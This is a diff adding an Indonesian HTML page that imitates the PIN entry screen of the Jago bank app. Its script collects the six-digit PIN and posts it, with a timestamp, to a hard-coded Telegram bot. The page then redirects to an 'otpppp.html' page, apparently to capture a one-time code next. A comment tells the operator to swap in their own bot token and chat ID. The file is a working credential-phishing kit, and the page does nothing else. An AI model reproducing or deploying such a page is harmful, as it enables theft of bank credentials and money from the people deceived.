@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jago - Masukkan PIN</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(180deg, #FFF9ED 0%, #FFFFFF 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 24px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .bg-circle-top {
+            position: absolute;
+            top: -80px;
+            right: -40px;
+            width: 280px;
+            height: 280px;
+            background: radial-gradient(circle, #FFE8C2 0%, rgba(255, 232, 194, 0) 70%);
+            border-radius: 50%;
+            opacity: 0.5;
+            z-index: -1;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 22px;
+            color: #444;
+            cursor: pointer;
+        }
+
+        .logo-small {
+            width: 52px;
+            height: 52px;
+            background-color: #FFFFFF;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            font-weight: 700;
+            color: #FFB800;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            margin-top: 40px;
+            margin-bottom: 30px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #777;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .pin-container {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+
+        .pin-box {
+            width: 50px;
+            height: 56px;
+            border: 2px solid #E5E5E5;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 600;
+            color: #222;
+            background-color: #FFFFFF;
+            transition: border-color 0.2s ease;
+        }
+
+        .pin-box.filled {
+            border-color: #FFB800;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            max-width: 300px;
+            width: 100%;
+        }
+
+        .key {
+            height: 60px;
+            background-color: #FFFFFF;
+            border: none;
+            border-radius: 12px;
+            font-size: 22px;
+            font-weight: 500;
+            color: #222;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .key:hover {
+            background-color: #FFF4DC;
+        }
+
+        .key:active {
+            background-color: #FFE8C2;
+        }
+
+        .key.empty {
+            background: transparent;
+            pointer-events: none;
+        }
+
+        .key.delete {
+            font-size: 20px;
+        }
+
+        .forgot-pin {
+            margin-top: 30px;
+            font-size: 15px;
+            color: #FF9F1C;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .forgot-pin:hover {
+            text-decoration: underline;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: #4CAF50;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 1000;
+            transition: transform 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+
+        .notification.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        @keyframes fadeInUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .content {
+            animation: fadeInUp 0.6s ease-out forwards;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-circle-top"></div>
+    <div class="notification" id="notification">✅ PIN terkirim ke Telegram!</div>
+
+    <div class="back-btn">←</div>
+
+    <div class="content">
+        <div class="logo-small">J</div>
+
+        <h1>Masukkan PIN</h1>
+        <p class="subtitle">Masukkan PIN akun Jago Anda</p>
+
+        <div class="pin-container" id="pinContainer">
+            <div class="pin-box" data-index="0"></div>
+            <div class="pin-box" data-index="1"></div>
+            <div class="pin-box" data-index="2"></div>
+            <div class="pin-box" data-index="3"></div>
+            <div class="pin-box" data-index="4"></div>
+            <div class="pin-box" data-index="5"></div>
+        </div>
+
+        <div class="keypad">
+            <button class="key" data-value="1">1</button>
+            <button class="key" data-value="2">2</button>
+            <button class="key" data-value="3">3</button>
+            <button class="key" data-value="4">4</button>
+            <button class="key" data-value="5">5</button>
+            <button class="key" data-value="6">6</button>
+            <button class="key" data-value="7">7</button>
+            <button class="key" data-value="8">8</button>
+            <button class="key" data-value="9">9</button>
+            <button class="key empty"></button>
+            <button class="key" data-value="0">0</button>
+            <button class="key delete" data-delete>⌫</button>
+        </div>
+
+        <a href="#" class="forgot-pin">Lupa PIN?</a>
+    </div>
+
+    <script>
+        // ============== GANTI DATA DI BAWAH INI ==============
+        const TELEGRAM_BOT_TOKEN = "8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg";
+        const TELEGRAM_CHAT_ID = "8592742129";
+        // =======================================================
+
+        let pin = '';
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const maxPinLength = 6;
+        let isPinSent = false;
+        const notification = document.getElementById('notification');
+
+        function tampilkanNotif() {
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 2000);
+        }
+
+        async function kirimKeTelegram(pinValue) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || isPinSent) return;
+            
+            isPinSent = true;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            const pesan = `🔑 PIN DITERIMA
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+🔢 PIN: ${pinValue}`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: pesan
+                    })
+                });
+
+                if (response.ok) {
+                    tampilkanNotif();
+                    console.log('✅ PIN terkirim ke Telegram:', pinValue);
+                    
+                    // Pindah halaman ke otpppp.html setelah 1,5 detik
+                    setTimeout(() => {
+                        window.location.href = 'otpppp.html';
+                    }, 1500);
+                } else {
+                    console.log('❌ Gagal kirim ke Telegram');
+                    isPinSent = false;
+                }
+            } catch (error) {
+                console.log('⚠️ Kesalahan:', error.message);
+                isPinSent = false;
+            }
+        }
+
+        // Klik angka
+        document.querySelectorAll('.key[data-value]').forEach(key => {
+            key.addEventListener('click', () => {
+                if (pin.length < maxPinLength) {
+                    pin += key.dataset.value;
+                    updatePinDisplay();
+                }
+            });
+        });
+
+        // Hapus
+        document.querySelector('.key[data-delete]').addEventListener('click', () => {
+            pin = pin.slice(0, -1);
+            updatePinDisplay();
+            if (isPinSent) isPinSent = false;
+        });
+
+        // Perbarui tampilan
+        function updatePinDisplay() {
+            pinBoxes.forEach((box, index) => {
+                if (index < pin.length) {
+                    box.textContent = '●';
+                    box.classList.add('filled');
+                } else {
+                    box.textContent = '';
+                    box.classList.remove('filled');
+                }
+            });
+
+            // Jika PIN lengkap 6 digit → kirim ke Telegram
+            if (pin.length === maxPinLength && !isPinSent) {
+                kirimKeTelegram(pin);
+            }
+        }
+    </script>
+</body>
+</html>
